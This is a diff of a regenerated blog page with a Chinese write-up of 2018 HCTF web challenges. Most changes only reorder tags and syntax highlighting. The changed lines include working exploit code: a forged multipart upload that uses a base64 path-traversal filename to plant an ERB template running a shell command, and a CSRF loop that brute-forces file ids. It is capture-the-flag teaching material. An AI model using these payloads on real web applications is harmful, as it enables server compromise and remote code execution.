@@ -9,7 +9,7 @@
   <title>2018 HCTF web WriteUp | 打代码的怪兽 CodeMonster</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="周末肝了两天HCTF，感谢队友们带飞，这里记录一下做的WEB题顺便打个小广告：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc. 选手，急招二进制和密码选手,有意向的大佬请联系ZGUxdGFAcHJvdG9ubWFpbC5jb20=">
-<meta name="keywords" content="CTF,WriteUp,WEB">
+<meta name="keywords" content="WriteUp,CTF,WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2018 HCTF web WriteUp">
 <meta property="og:url" content="https://www.codemonster.cn/2018/11/13/2018-hctf-web-writeup/index.html">
@@ -263,10 +263,10 @@
 <li>CSRF 调用/file/Alpha_test 接口把文件分配到自己的id下，在/Alphatest拿到生成的文件名</li>
 <li>主页文件包含，RCE</li>
 </ol>
-<p>于是开始了艰难的构造payload<br>最后上传的payload如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-1.11.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">function upload(i) &#123;</span></div><div class="line"><span class="undefined">var test=$('meta').eq(1).attr("content");</span></div><div class="line"><span class="undefined">var url="/file/upload";</span></div><div class="line"><span class="undefined">  var data="-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"file[myfile]\"; filename=\"Li4vLi4vYXBwL3ZpZXdzL2hvbWUvZGUxdGF4aXNoaXIuZXJic3MuZXJi\"\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Type: application/text\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">PCU9IGBjYXQgL2ZsYWdgICU+\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"file[context]\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">de1ta\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"authenticity_token\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">"+test+"\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"commit\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">submit\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"utf8\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">✓\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835--";</span></div><div class="line"><span class="undefined">  $.ajax(&#123;</span></div><div class="line"><span class="undefined">   url: url,</span></div><div class="line"><span class="undefined">   type:"POST",</span></div><div class="line"><span class="undefined">   headers: &#123;</span></div><div class="line"><span class="undefined">       "Content-Type": "multipart/form-data; boundary=---------------------------13025814701038468772945051835",</span></div><div class="line"><span class="undefined">       "Upgrade-Insecure-Requests":"1"</span></div><div class="line"><span class="undefined">   &#125;,</span></div><div class="line"><span class="undefined">   data:data,</span></div><div class="line"><span class="undefined">   contentType:false,</span></div><div class="line"><span class="undefined">   success:function(res)&#123;</span></div><div class="line"><span class="undefined">   &#125;,</span></div><div class="line"><span class="undefined">   error:function(err)&#123;</span></div><div class="line"><span class="undefined">   &#125;</span></div><div class="line"><span class="undefined">  &#125;)</span></div><div class="line"><span class="undefined"> &#125;</span></div><div class="line"><span class="undefined"> for(var i=1;i&lt;2;i++)</span></div><div class="line"><span class="undefined"> &#123;</span></div><div class="line"><span class="undefined">    upload(i);</span></div><div class="line"><span class="undefined"> &#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>于是开始了艰难的构造payload<br>最后上传的payload如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-1.11.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">i</span>) </span>&#123;</span></div><div class="line"><span class="javascript"><span class="keyword">var</span> test=$(<span class="string">'meta'</span>).eq(<span class="number">1</span>).attr(<span class="string">"content"</span>);</span></div><div class="line"><span class="javascript"><span class="keyword">var</span> url=<span class="string">"/file/upload"</span>;</span></div><div class="line"><span class="javascript">  <span class="keyword">var</span> data=<span class="string">"-----------------------------13025814701038468772945051835\x0d\x0a\</span></span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"file[myfile]\"; filename=\"Li4vLi4vYXBwL3ZpZXdzL2hvbWUvZGUxdGF4aXNoaXIuZXJic3MuZXJi\"\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Type: application/text\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">PCU9IGBjYXQgL2ZsYWdgICU+\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"file[context]\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">de1ta\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"authenticity_token\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="javascript"><span class="string">"+test+"</span>\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"commit\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">submit\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"utf8\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">✓\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835--";</span></div><div class="line"><span class="javascript">  $.ajax(&#123;</span></div><div class="line"><span class="undefined">   url: url,</span></div><div class="line"><span class="javascript">   type:<span class="string">"POST"</span>,</span></div><div class="line"><span class="undefined">   headers: &#123;</span></div><div class="line"><span class="javascript">       <span class="string">"Content-Type"</span>: <span class="string">"multipart/form-data; boundary=---------------------------13025814701038468772945051835"</span>,</span></div><div class="line"><span class="javascript">       <span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span></span></div><div class="line"><span class="undefined">   &#125;,</span></div><div class="line"><span class="undefined">   data:data,</span></div><div class="line"><span class="javascript">   contentType:<span class="literal">false</span>,</span></div><div class="line"><span class="javascript">   success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span></div><div class="line"><span class="undefined">   &#125;,</span></div><div class="line"><span class="javascript">   error:<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span></div><div class="line"><span class="undefined">   &#125;</span></div><div class="line"><span class="undefined">  &#125;)</span></div><div class="line"><span class="undefined"> &#125;</span></div><div class="line"><span class="javascript"> <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="number">2</span>;i++)</span></div><div class="line"><span class="undefined"> &#123;</span></div><div class="line"><span class="undefined">    upload(i);</span></div><div class="line"><span class="undefined"> &#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>文件内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%= `cat /flag` %&gt;</div></pre></td></tr></table></figure></p>
 <p>文件名为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">../../app/views/home/de1taxishir.erbss.erb</div></pre></td></tr></table></figure></p>
-<p>推送文件到我的uid下的代码为：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-1.11.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">function go(fffid)&#123;</span></div><div class="line"><span class="undefined">  var test=$('meta').eq(1).attr("content");</span></div><div class="line"><span class="undefined">  console.log(test);</span></div><div class="line"><span class="undefined">  var params = &#123;utf8:"\xE2\x9C\x93",authenticity_token:test,uid:2,fid:fffid,commit:"submit"&#125;;</span></div><div class="line"><span class="undefined">  var url = '/file/Alpha_test';</span></div><div class="line"><span class="undefined">$.ajax(&#123;</span></div><div class="line"><span class="undefined">   url : url,</span></div><div class="line"><span class="undefined">   type : "POST",</span></div><div class="line"><span class="undefined">   data : params,</span></div><div class="line"><span class="undefined">   success : function(result) &#123;</span></div><div class="line"><span class="undefined">   &#125;,</span></div><div class="line"><span class="undefined">   error:function(result)&#123;</span></div><div class="line"><span class="undefined">   &#125;</span></div><div class="line"><span class="undefined"> &#125;)</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">for(var i=1;i&lt;20;i+=1)&#123;</span></div><div class="line"><span class="undefined">  go(i);</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>推送文件到我的uid下的代码为：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-1.11.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params">fffid</span>)</span>&#123;</span></div><div class="line"><span class="javascript">  <span class="keyword">var</span> test=$(<span class="string">'meta'</span>).eq(<span class="number">1</span>).attr(<span class="string">"content"</span>);</span></div><div class="line"><span class="javascript">  <span class="built_in">console</span>.log(test);</span></div><div class="line"><span class="javascript">  <span class="keyword">var</span> params = &#123;<span class="attr">utf8</span>:<span class="string">"\xE2\x9C\x93"</span>,<span class="attr">authenticity_token</span>:test,<span class="attr">uid</span>:<span class="number">2</span>,<span class="attr">fid</span>:fffid,<span class="attr">commit</span>:<span class="string">"submit"</span>&#125;;</span></div><div class="line"><span class="javascript">  <span class="keyword">var</span> url = <span class="string">'/file/Alpha_test'</span>;</span></div><div class="line"><span class="javascript">$.ajax(&#123;</span></div><div class="line"><span class="undefined">   url : url,</span></div><div class="line"><span class="javascript">   type : <span class="string">"POST"</span>,</span></div><div class="line"><span class="undefined">   data : params,</span></div><div class="line"><span class="javascript">   success : <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span></div><div class="line"><span class="undefined">   &#125;,</span></div><div class="line"><span class="javascript">   error:<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span></div><div class="line"><span class="undefined">   &#125;</span></div><div class="line"><span class="undefined"> &#125;)</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="number">20</span>;i+=<span class="number">1</span>)&#123;</span></div><div class="line"><span class="undefined">  go(i);</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>这里因为不知道文件id是多少，只能根据前面的filenumber来爆破一下，所以写了个for循环<br>最后上传上去并获取文件名后，在主页进行文件包含执行命令，读取flag</p>
 <p><img src="/img/2018-hctf-4.png" alt=""></p>
 <p>ps：这道题有个搅💩bug，利用推文件给用户接口，无限暴力推fid到自己的uid下，就能看到别人上传的文件，并且别人就不知道他的文件名是啥了</p>
@@ -319,11 +319,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">WriteUp</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">WriteUp</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
@@ -571,22 +571,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">WriteUp</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">WEB</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">mysql字符截断</a>
               </li>
              
@@ -611,6 +595,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">WriteUp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">MISC</a>
               </li>
              
@@ -623,10 +615,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">AWD</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
               </li>
              
@@ -635,11 +623,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">SQL注入</a>
+                <a href="javascript:void(0)" class="js-tag color4">Web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">加固</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">SQL注入</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -651,23 +647,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">SQL</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Crypto</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Misc</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Web</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">加固</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -683,11 +667,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">SQL</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Struts2</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
+                <a href="javascript:void(0)" class="js-tag color4">WEB</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">apache</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">https</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -707,23 +703,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CVE</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">WordPress</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">apache</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">https</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">JAVA</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -743,6 +735,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">JAVA</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">excel</a>
               </li>
              
@@ -752,6 +748,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">递归</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">AWD</a>
               </li>
              
               <li class="article-tag-list-item">
